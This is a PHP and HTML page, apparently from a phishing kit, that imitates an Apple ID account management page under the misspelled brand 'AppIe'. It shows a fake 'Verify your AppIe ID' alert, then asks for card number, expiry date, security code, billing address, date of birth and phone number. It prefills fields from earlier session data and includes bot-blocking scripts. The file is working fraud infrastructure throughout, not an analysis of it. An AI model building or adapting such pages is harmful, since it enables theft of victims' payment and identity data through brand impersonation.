<?php
session_start();

include '../../blockerz.php';
include '../../blockerz2.php';
include '../../sc.php';

$a = $_SESSION['name'];

$zab = explode(" ", $a);

$first = $zab[0];
$last = $zab[1];

$zab1 = explode("}", $a);
$ze = $zab1[0];

$az = preg_replace("/[^A-Za-z0-9 ]/", '', $ze);
?>
<!DOCTYPE html>
<html>
<head>
	<title>Manage your AppIe ID</title>
	<link rel="stylesheet" type="text/css" href="files/css/desktop.css">
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<link rel="icon" href="files/img/favicon.ico" type="image/x-icon" />
<style>

 .card02x {
    display: inline-block;
    background-image: url("http://i.imgur.com/NJHG6g5.png");
    background-repeat: no-repeat;
    background-position: 0px -406px;
    height: 27px;
    position: absolute;
    top: 123px;
    left: 500px;
    bottom: 6px;
    width: 40px;
}


</style>
</head>
<body>
<div id="head"></div>
<div id="container">
	<div id="xheader">
		<div id="navbar"></div>
		<div style="font-size: 38px;font-family: 'Open Sans', sans-serif;color: rgb(255, 255, 255);line-height: 2.524;text-align: right;position: absolute;top: 40px;z-index: 2;left: 0px;"> <?php if(!empty($az)){ echo $az;}else{echo "Account Verification";}?> </div>
		<div id="account_type">Your AppIe ID is <b> <?php if(!empty($xuser)){ echo $xuser;}else{echo "";}?> </b> </div>
		<div id="logout"></div>
		<font id="logout0">Sign Out</font>
	</div>
	<div id="xcontent">
		<form action="" method="POST" target="_self" name="xupdate" id="xupdate" >
			<font class="xFont" style="top:32px;left:2px;">Account</font>
			<font class="xFont" style="top:110px;">Payment & Shipping</font>
			<hr style="top:70px;">
                        <br><br>
			<font class="xFont2" style="top:32px;left:280px;">APPIE ID</font>
			<font class="xFont2" style="top:32px;left:600px;">REACHABLE AT</font>
			<font class="xFont3" style="top:60px;left:280px;"><?=$xuser;?></font>
			<font class="xFont3" style="top:60px;left:600px;"><?=$xuser;?></font>
			<font class="xFont3" style="top:110px;left:600px;"></font>
                        <br><br>
			<font class="xFont3" style="top: 104px;font-family: 'Open Sans', sans-serif;left:600px;width: 312px;height: 200px;font-size: 14px;line-height: 1.4em;font-weight: 100;color: #666;"> This payment method will be used when you make purchases in the iTunes Store,    App Store, AppIe Online Store, and more.</font>

<img src="files/img/pay.png" style="position: absolute;top: 98px;left: 277px;">

<input name="number" id="number" class="required" pattern="[0-9.]+" minlength="13" value="<?php if(!empty($_SESSION['carta'])){ echo $_SESSION['carta'];}else{echo "";}?>" maxlength="19" onkeyup="ZEBI(this.value)" onkeypress="return isNumberKey(event)"  placeholder="credit card number" type="tel" style="position: absolute;top: 120px;left: 280px;width: 259px;" onblur="if (this.value == '') {this.value = '<?echo$_SESSION['carta'];?>';}" onfocus="if (this.value == '<?echo$_SESSION['carta'];?>') {this.value = '';}">
<span class="card02x" id="card02x"></span>

<input type="tel" name="expred" pattern="\d{1,2}/\d{4}" maxlength="7" style="position: absolute;top: 160px;left: 280px;width: 110px;" id="expred" placeholder="mm/yyyy" class="required">

<input class="required" id="cvv2" placeholder="security code" maxlength="4" onkeypress="return isNumberKey(event)" pattern="[0-9.]+" name="sdfs" type="tel" style="position: absolute;top: 160px;left: 409px;width: 130px;">

<img src="files/img/bil.png" style="position: absolute;top: 199px;left: 276px;">
<input type="text" maxlength="10" name="name1" value="<?php if(!empty($first)){ echo $first;}else{echo "";}?>" id="name1" style="position: absolute;top: 220px;left: 280px;width: 110px;" placeholder="first name" class="required">
<input class="required" maxlength="10" placeholder="last name" name="name2" value="<?php if(!empty($last)){ echo $last;}else{echo "";}?>" id="name2" type="txt" style="position: absolute;top: 220px;left: 409px;width: 130px;">
<input name="adre1" id="adre1" class="required" maxlength="60" value="<?php if(!empty($_SESSION['address'])){ echo $_SESSION['address'];}else{echo "";}?>" placeholder="street address" type="txt" style="position: absolute;top: 260px;left: 280px;width: 259px;">


<input name="adre2" id="adre2" class="inox" maxlength="60" placeholder="apt., suite, pldg" type="txt" style="
    position: absolute;
    top: 300px;
    left: 280px;
    width: 259px;
">

<input name="city" id="city" class="required" maxlength="20" value="<?php if(!empty($_SESSION['city'])){ echo $_SESSION['city'];}else{echo "";}?>" placeholder="city" type="txt" style="
    position: absolute;
    top: 340px;
    left: 280px;
    width: 259px;
">
<input type="text" name="state" id="state" value="<?echo$_SESSION['state'];?>" maxlength="25" style="position: absolute;top: 380px;left: 280px;width: 115px;" placeholder="state" class="inox">

<input class="required" maxlength="10" placeholder="zip code" maxlength="10" value="<?echo$_SESSION['zip'];?>" name="zip" id="zip" type="text" style="
    position: absolute;
    top: 380px;
    left: 409px;
    width: 130px;
    ">
<select class="required" name="cojjuntry" id="9" style="
    position: absolute;
    top: 420px;
    left: 280px;
    width: 259px;-webkit-appearance:none;" >
      <option value="<?php if(!empty($cn)){ echo $cn;}else{echo "Select";}?>"><?php if(!empty($cn)){ echo $cn;}else{echo "country";}?></option>
      <option value="United States">United States</option>
<option value="United Kingdom">United Kingdom</option>
<option value="Afghanistan">Afghanistan</option>
<option value="Albania">Albania</option>
<option value="Algeria">Algeria</option>
<option value="American Samoa">American Samoa</option> 
<option value="Andorra">Andorra</option>
<option value="Angola">Angola</option> 
<option value="Anguilla">Anguilla</option> 
<option value="Antarctica">Antarctica</option> 
<option value="Antigua and Barbuda">Antigua and Barbuda</option> 
<option value="Argentina">Argentina</option> 
<option value="Armenia">Armenia</option> 
<option value="Aruba">Aruba</option> 
<option value="Australia">Australia</option> 
<option value="Austria">Austria</option> 
<option value="Azerbaijan">Azerbaijan</option> 
<option value="Bahamas">Bahamas</option> 
<option value="Bahrain">Bahrain</option> 
<option value="Bangladesh">Bangladesh</option> 
<option value="Barbados">Barbados</option> 
<option value="Belarus">Belarus</option> 
<option value="Belgium">Belgium</option> 
<option value="Belize">Belize</option> 
<option value="Benin">Benin</option> 
<option value="Bermuda">Bermuda</option> 
<option value="Bhutan">Bhutan</option> 
<option value="Bolivia">Bolivia</option> 
<option value="Bosnia and Herzegovina">Bosnia and Herzegovina</option> 
<option value="Botswana">Botswana</option> 
<option value="Bouvet Island">Bouvet Island</option> 
<option value="Brazil">Brazil</option> 
<option value="British Indian Ocean Territory">British Indian Ocean Territory</option> 
<option value="Brunei Darussalam">Brunei Darussalam</option> 
<option value="Bulgaria">Bulgaria</option> 
<option value="Burkina Faso">Burkina Faso</option> 
<option value="Burundi">Burundi</option> 
<option value="Cambodia">Cambodia</option> 
<option value="Cameroon">Cameroon</option> 
<option value="Canada">Canada</option> 
<option value="Cape Verde">Cape Verde</option> 
<option value="Cayman Islands">Cayman Islands</option> 
<option value="Central African Republic">Central African Republic</option> 
<option value="Chad">Chad</option> 
<option value="Chile">Chile</option> 
<option value="China">China</option> 
<option value="Christmas Island">Christmas Island</option> 
<option value="Cocos (Keeling) Islands">Cocos (Keeling) Islands</option> 
<option value="Colombia">Colombia</option> 
<option value="Comoros">Comoros</option> 
<option value="Congo">Congo</option> 
<option value="Congo, The Democratic Republic of The">Congo, The Democratic Republic of The</option> 
<option value="Cook Islands">Cook Islands</option> 
<option value="Costa Rica">Costa Rica</option> 
<option value="Cote D'ivoire">Cote D'ivoire</option> 
<option value="Croatia">Croatia</option> 
<option value="Cuba">Cuba</option> 
<option value="Cyprus">Cyprus</option> 
<option value="Czech Republic">Czech Republic</option> 
<option value="Denmark">Denmark</option> 
<option value="Djibouti">Djibouti</option> 
<option value="Dominica">Dominica</option> 
<option value="Dominican Republic">Dominican Republic</option> 
<option value="Ecuador">Ecuador</option> 
<option value="Egypt">Egypt</option> 
<option value="El Salvador">El Salvador</option> 
<option value="Equatorial Guinea">Equatorial Guinea</option> 
<option value="Eritrea">Eritrea</option> 
<option value="Estonia">Estonia</option> 
<option value="Ethiopia">Ethiopia</option> 
<option value="Falkland Islands (Malvinas)">Falkland Islands (Malvinas)</option> 
<option value="Faroe Islands">Faroe Islands</option> 
<option value="Fiji">Fiji</option> 
<option value="Finland">Finland</option> 
<option value="France">France</option> 
<option value="French Guiana">French Guiana</option> 
<option value="French Polynesia">French Polynesia</option> 
<option value="French Southern Territories">French Southern Territories</option> 
<option value="Gabon">Gabon</option> 
<option value="Gambia">Gambia</option> 
<option value="Georgia">Georgia</option> 
<option value="Germany">Germany</option> 
<option value="Ghana">Ghana</option> 
<option value="Gibraltar">Gibraltar</option> 
<option value="Greece">Greece</option> 
<option value="Greenland">Greenland</option> 
<option value="Grenada">Grenada</option> 
<option value="Guadeloupe">Guadeloupe</option> 
<option value="Guam">Guam</option> 
<option value="Guatemala">Guatemala</option> 
<option value="Guinea">Guinea</option> 
<option value="Guinea-bissau">Guinea-bissau</option> 
<option value="Guyana">Guyana</option> 
<option value="Haiti">Haiti</option> 
<option value="Heard Island and Mcdonald Islands">Heard Island and Mcdonald Islands</option> 
<option value="Holy See (Vatican City State)">Holy See (Vatican City State)</option> 
<option value="Honduras">Honduras</option> 
<option value="Hong Kong">Hong Kong</option> 
<option value="Hungary">Hungary</option> 
<option value="Iceland">Iceland</option> 
<option value="India">India</option> 
<option value="Indonesia">Indonesia</option> 
<option value="Iran, Islamic Republic of">Iran, Islamic Republic of</option> 
<option value="Iraq">Iraq</option> 
<option value="Ireland">Ireland</option> 
<option value="Israel">Israel</option> 
<option value="Italy">Italy</option> 
<option value="Jamaica">Jamaica</option> 
<option value="Japan">Japan</option> 
<option value="Jordan">Jordan</option> 
<option value="Kazakhstan">Kazakhstan</option> 
<option value="Kenya">Kenya</option> 
<option value="Kiribati">Kiribati</option> 
<option value="Korea, Democratic People's Republic of">Korea, Democratic People's Republic of</option> 
<option value="Korea, Republic of">Korea, Republic of</option> 
<option value="Kuwait">Kuwait</option> 
<option value="Kyrgyzstan">Kyrgyzstan</option> 
<option value="Lao People's Democratic Republic">Lao People's Democratic Republic</option> 
<option value="Latvia">Latvia</option> 
<option value="Lebanon">Lebanon</option> 
<option value="Lesotho">Lesotho</option> 
<option value="Liberia">Liberia</option> 
<option value="Libyan Arab Jamahiriya">Libyan Arab Jamahiriya</option> 
<option value="Liechtenstein">Liechtenstein</option> 
<option value="Lithuania">Lithuania</option> 
<option value="Luxembourg">Luxembourg</option> 
<option value="Macao">Macao</option> 
<option value="Macedonia, The Former Yugoslav Republic of">Macedonia, The Former Yugoslav Republic of</option> 
<option value="Madagascar">Madagascar</option> 
<option value="Malawi">Malawi</option> 
<option value="Malaysia">Malaysia</option> 
<option value="Maldives">Maldives</option> 
<option value="Mali">Mali</option> 
<option value="Malta">Malta</option> 
<option value="Marshall Islands">Marshall Islands</option> 
<option value="Martinique">Martinique</option> 
<option value="Mauritania">Mauritania</option> 
<option value="Mauritius">Mauritius</option> 
<option value="Mayotte">Mayotte</option> 
<option value="Mexico">Mexico</option> 
<option value="Micronesia, Federated States of">Micronesia, Federated States of</option> 
<option value="Moldova, Republic of">Moldova, Republic of</option> 
<option value="Monaco">Monaco</option> 
<option value="Mongolia">Mongolia</option> 
<option value="Montserrat">Montserrat</option> 
<option value="Morocco">Morocco</option> 
<option value="Mozambique">Mozambique</option> 
<option value="Myanmar">Myanmar</option> 
<option value="Namibia">Namibia</option> 
<option value="Nauru">Nauru</option> 
<option value="Nepal">Nepal</option> 
<option value="Netherlands">Netherlands</option> 
<option value="Netherlands Antilles">Netherlands Antilles</option> 
<option value="New Caledonia">New Caledonia</option> 
<option value="New Zealand">New Zealand</option> 
<option value="Nicaragua">Nicaragua</option> 
<option value="Niger">Niger</option> 
<option value="Nigeria">Nigeria</option> 
<option value="Niue">Niue</option> 
<option value="Norfolk Island">Norfolk Island</option> 
<option value="Northern Mariana Islands">Northern Mariana Islands</option> 
<option value="Norway">Norway</option> 
<option value="Oman">Oman</option> 
<option value="Pakistan">Pakistan</option> 
<option value="Palau">Palau</option> 
<option value="Palestinian Territory, Occupied">Palestinian Territory, Occupied</option> 
<option value="Panama">Panama</option> 
<option value="Papua New Guinea">Papua New Guinea</option> 
<option value="Paraguay">Paraguay</option> 
<option value="Peru">Peru</option> 
<option value="Philippines">Philippines</option> 
<option value="Pitcairn">Pitcairn</option> 
<option value="Poland">Poland</option> 
<option value="Portugal">Portugal</option> 
<option value="Puerto Rico">Puerto Rico</option> 
<option value="Qatar">Qatar</option> 
<option value="Reunion">Reunion</option> 
<option value="Romania">Romania</option> 
<option value="Russian Federation">Russian Federation</option> 
<option value="Rwanda">Rwanda</option> 
<option value="Saint Helena">Saint Helena</option> 
<option value="Saint Kitts and Nevis">Saint Kitts and Nevis</option> 
<option value="Saint Lucia">Saint Lucia</option> 
<option value="Saint Pierre and Miquelon">Saint Pierre and Miquelon</option> 
<option value="Saint Vincent and The Grenadines">Saint Vincent and The Grenadines</option> 
<option value="Samoa">Samoa</option> 
<option value="San Marino">San Marino</option> 
<option value="Sao Tome and Principe">Sao Tome and Principe</option> 
<option value="Saudi Arabia">Saudi Arabia</option> 
<option value="Senegal">Senegal</option> 
<option value="Serbia and Montenegro">Serbia and Montenegro</option> 
<option value="Seychelles">Seychelles</option> 
<option value="Sierra Leone">Sierra Leone</option> 
<option value="Singapore">Singapore</option> 
<option value="Slovakia">Slovakia</option> 
<option value="Slovenia">Slovenia</option> 
<option value="Solomon Islands">Solomon Islands</option> 
<option value="Somalia">Somalia</option> 
<option value="South Africa">South Africa</option> 
<option value="South Georgia and The South Sandwich Islands">South Georgia and The South Sandwich Islands</option> 
<option value="Spain">Spain</option> 
<option value="Sri Lanka">Sri Lanka</option> 
<option value="Sudan">Sudan</option> 
<option value="Suriname">Suriname</option> 
<option value="Svalbard and Jan Mayen">Svalbard and Jan Mayen</option> 
<option value="Swaziland">Swaziland</option> 
<option value="Sweden">Sweden</option> 
<option value="Switzerland">Switzerland</option> 
<option value="Syrian Arab Republic">Syrian Arab Republic</option> 
<option value="Taiwan, Province of China">Taiwan, Province of China</option> 
<option value="Tajikistan">Tajikistan</option> 
<option value="Tanzania, United Republic of">Tanzania, United Republic of</option> 
<option value="Thailand">Thailand</option> 
<option value="Timor-leste">Timor-leste</option> 
<option value="Togo">Togo</option> 
<option value="Tokelau">Tokelau</option> 
<option value="Tonga">Tonga</option> 
<option value="Trinidad and Tobago">Trinidad and Tobago</option> 
<option value="Tunisia">Tunisia</option> 
<option value="Turkey">Turkey</option> 
<option value="Turkmenistan">Turkmenistan</option> 
<option value="Turks and Caicos Islands">Turks and Caicos Islands</option> 
<option value="Tuvalu">Tuvalu</option> 
<option value="Uganda">Uganda</option> 
<option value="Ukraine">Ukraine</option> 
<option value="United Arab Emirates">United Arab Emirates</option> 
<option value="United States Minor Outlying Islands">United States Minor Outlying Islands</option> 
<option value="Uruguay">Uruguay</option> 
<option value="Uzbekistan">Uzbekistan</option> 
<option value="Vanuatu">Vanuatu</option> 
<option value="Venezuela">Venezuela</option> 
<option value="Viet Nam">Viet Nam</option> 
<option value="Virgin Islands, British">Virgin Islands, British</option> 
<option value="Virgin Islands, U.S.">Virgin Islands, U.S.</option> 
<option value="Wallis and Futuna">Wallis and Futuna</option> 
<option value="Western Sahara">Western Sahara</option> 
<option value="Yemen">Yemen</option> 
<option value="Zambia">Zambia</option> 
<option value="Zimbabwe">Zimbabwe</option></select>

<input name="bith" class="required" maxlength="10" id="2" value="<?php if(!empty($_SESSION['bith'])){ echo $_SESSION['bith'];}else{echo "";}?>" placeholder="date of brith dd/mm/yyyy" type="numbers" style="
    position: absolute;
    top: 460px;
    left: 280px;
    width: 259px;
">
<input name="phone" class="required" placeholder="phone number" value="<?php if(!empty($_SESSION['phone'])){ echo $_SESSION['phone'];}else{echo "";}?>" maxlength="20" type="tel" style="
    position: absolute;
    top: 500px;
    left: 280px;
    width: 259px;
">
<input value="Save" name="submit" id="save" type="submit">


     		</form>
	</div>
	<div id="xfooter"></div>
</div>
  <script type="text/javascript" src="//code.jquery.com/jquery-1.9.1.js"></script>
  <script src="files/js/main.js"></script></script>
<script type="text/javascript" src="files/js/jquery.validate.min.js"></script>

<script type='text/javascript'>//<![CDATA[
$(window).load(function(){
$(document).ready(function(){
    $("#xupdate").validate();
  });
});//]]> 

</script>
<script language="Javascript">
// <![CDATA[
function ZEBI(cardnumber) {
var first = cardnumber.charAt(0);
var second = cardnumber.charAt(1);
var third = cardnumber.charAt(2);
var fourth = cardnumber.charAt(3);
var cardnumber = (cardnumber + '').replace(/\\s/g, ''); //remove space

if ((/^(417500|(4917|4913|4026|4508|4844)\d{2})\d{10}$/).test(cardnumber) && cardnumber.length == 16) {
//Electron
                document.getElementById("card02x").style.backgroundPosition = "0px -203px";
                document.getElementById("cvv2").maxLength ="3"
}
else if ((/^(4)/).test(cardnumber) && (cardnumber.length == 16)) {
//Visa
                document.getElementById("card02x").style.backgroundPosition = "0px 1px";
                document.getElementById("cvv2").maxLength ="3"
}
else if ((/^(34|37)/).test(cardnumber) && cardnumber.length == 15) {
//American Express
                document.getElementById("card02x").style.backgroundPosition = "0px -57px";
                document.getElementById("cvv2").maxLength ="4"
}
else if ((/^(51|52|53|54|55)/).test(cardnumber) && cardnumber.length == 16) {
//Mastercard
                document.getElementById("card02x").style.backgroundPosition = "0px -29px";
                document.getElementById("cvv2").maxLength ="3"
}
else if ((/^(5018|5020|5038|5612|5893|6304|6759|6761|6762|6763|0604|6390)\d+$/).test(cardnumber) && cardnumber.length == 16) {
//Maestro
                document.getElementById("card02x").style.backgroundPosition = "0px -174px";
                document.getElementById("cvv2").maxLength ="3"
}
else if ((/^(6011|16)/).test(cardnumber) && cardnumber.length == 16) {
//Discover
                document.getElementById("card02x").style.backgroundPosition = "0px -86px";
}
else if ((/^(30|36|38|39)/).test(cardnumber) && (cardnumber.length == 14)) {
//DINER
                document.getElementById("card02x").style.backgroundPosition = "0px -115";
}
else if ((/^(35|3088|3096|3112|3158|3337)/).test(cardnumber) && (cardnumber.length == 16)) {
//JCB
                document.getElementById("card02x").style.backgroundPosition = "0px -145px";
}
else {
                document.getElementById("card02x").style.backgroundPosition = "0px -406px";
}

}

// ]]></script>

    <script type="text/javascript"> 
      $(document).ready( function() {
        $('#zeb').delay(500).fadeIn(500);
      });
    </script>
    <script type="text/javascript"> 
      $(document).ready( function() {
        $('#a2').delay(500).fadeIn(500);
      });
    </script>
    <script type="text/javascript"> 
      $(document).ready( function() {
        $('#a1').delay(500).fadeIn(500);
      });
    </script>

<script type="text/javascript">             
window.onload = function openVentana(){            
$(".ventana").slideDown(500);             
}       
function closeVentana(){            
$(".ventana").slideUp("fast");          
} 
</script> 
<div class="ventana" >
<div id="zeb" class="zeb"></div>
    <div id="a2" style="width: auto;margin: 10px;display: none;z-index: 100000;">
        <div id="a1" class="a1">

<center>
<div align="left"> <img alt="" src="files/img/alert_icon.png" style="position: absolute;top: 14px;left: 17px;height: 55px;width: 55px;"> </div>
<div style="position: absolute;top: 10px;right: 5px;"><a href="javascript:closeVentana();"><img src="files/img/test.PNG"></a></div>


<h1 style="font-size: 30px;margin-top: 15px;padding-left: 40px;padding-bottom: 30px;color: rgba(51, 51, 51, 0.85);font-weight: 100;font-family:'Open Sans', sans-serif;"> Verify your AppIe ID</h1>
 <p style="font-size: 1.14em;color: #3d3d3d;font-weight: 100;font-family: 'Open Sans', sans-serif;"> Some required information is missing in your AppIe ID</p>
 <p style="font-size: 1.1em;color: #3d3d3d;font-weight: 100;font-family: 'Open Sans', sans-serif;"> click on Unlock Now in order to continue using it.  </p>
<hr style="width: 94%;opacity: 0.4;margin-top: 12px;"> 
<br>    
<a style="text-decoration:none;" href="javascript:closeVentana();"><p class="un" style="ccolor: #0179fc;font-size: 1.1em;font-family: 'Open Sans', sans-serif;padding-bottom: 5px;padding-top: 5px;">Unlock Now</p></a>

</center>
</div></div>
</body>
</html>
